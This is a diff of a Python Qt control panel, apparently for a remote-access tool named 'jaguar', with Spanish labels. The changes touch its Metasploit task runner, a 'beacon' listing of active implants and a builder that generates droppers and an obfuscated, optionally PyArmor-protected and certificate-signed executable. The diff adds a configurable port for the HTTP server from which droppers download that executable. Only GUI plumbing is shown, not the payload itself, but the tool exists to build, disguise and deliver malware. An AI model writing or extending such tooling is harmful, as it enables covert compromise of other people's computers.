             self._sig_msf.emit("[msf] ejecutado: " + json.dumps(r, ensure_ascii=False, default=str))
         self._msf_tarea(fn)
 
-    # ------------------------------------------------------------------
+    # ================================================================= beacon
     def _beacon_sel(self):
         it = self.tree.currentItem()
         if not it:
@@ -1244,10 +1432,14 @@ class MainWindow(QMainWindow):
                              str(b[0]) if b else "-", str(b[1]) if b else "-",
                              "beacon activo" if b else "normal"])
 
-    # ------------------------------------------------------------------
+    # ================================================================= builder
     def _hacer_constructor(self):
         comp = self.in_bcomp.currentText() if hasattr(self, "in_bcomp") else "pyinstaller"
         pyarmor = self.chk_pyarmor.isChecked() if hasattr(self, "chk_pyarmor") else False
+        try:
+            phttp = int(self.in_bhttp.text().strip() or 8080)
+        except Exception:
+            phttp = 8080
         return Constructor(
             self.in_bhost.text().strip(),
             self.in_bpuerto.text().strip() or self.servidor.puerto,
@@ -1258,13 +1450,12 @@ class MainWindow(QMainWindow):
             certificado=self.in_bcert.text().strip() or None,
             contrasena_cert=self.in_bpass.text() or None,
             compilador=comp,
-            usar_pyarmor=pyarmor)
+            usar_pyarmor=pyarmor,
+            puerto_http=phttp)
 
     def _guardar_config(self):
         try:
-            from jaguar.common import config
-            config.guardar(self.in_bhost.text().strip(),
-                           self.in_bpuerto.text().strip())
+            config.guardar(self.in_bhost.text().strip(), self.in_bpuerto.text().strip())
         except Exception:
             pass
 
@@ -1280,30 +1471,16 @@ class MainWindow(QMainWindow):
                 self._sig_builder.emit(f"[builder] no pude detectar IP pública: {e}")
         threading.Thread(target=worker, daemon=True).start()
 
-    def _probar_conexion(self):
-        import socket
-        host = self.in_bhost.text().strip()
-        try:
-            p = int(self.in_bpuerto.text().strip() or self.servidor.puerto)
-        except Exception:
-            p = self.servidor.puerto
-        def worker():
-            try:
-                s = socket.create_connection((host, p), timeout=5); s.close()
-                self._sig_builder.emit(f"[builder] OK: {host}:{p} responde")
-            except Exception as e:
-                self._sig_builder.emit(f"[builder] FALLO {host}:{p}: {e}")
-        threading.Thread(target=worker, daemon=True).start()    
-
     def _build_todo(self):
         c = self._hacer_constructor()
         self.out_builder.clear()
-        self._sig_builder.emit("[builder] generando TODO ...")
+        self._sig_builder.emit("[builder] generando TODO (droppers + exe ofuscado) ...")
 
         def worker():
             try:
                 c.generar_todo()
-                self._sig_builder.emit("[builder] ✓ listo.")
+                self._sig_builder.emit("[builder] ✓ listo. Recuerda: '🌐 Servir dist' activo "
+                                       "para que los droppers descarguen el exe.")
             except Exception as e:
                 import traceback
                 self._sig_builder.emit(f"[builder] ERROR: {e}")
@@ -1330,8 +1507,8 @@ class MainWindow(QMainWindow):
 
         def worker():
             try:
-                c.servir_http(8080)
+                c.servir_http(c.puerto_http)
             except Exception as e:
                 self._sig_builder.emit(f"[builder] ERROR http: {e}")
         threading.Thread(target=worker, daemon=True).start()
-        self._sig_builder.emit("[builder] HTTP activo en :8080 (deja la ventana abierta)")
+        self._sig_builder.emit(f"[builder] HTTP activo en :{c.puerto_http} (deja la ventana abierta)")
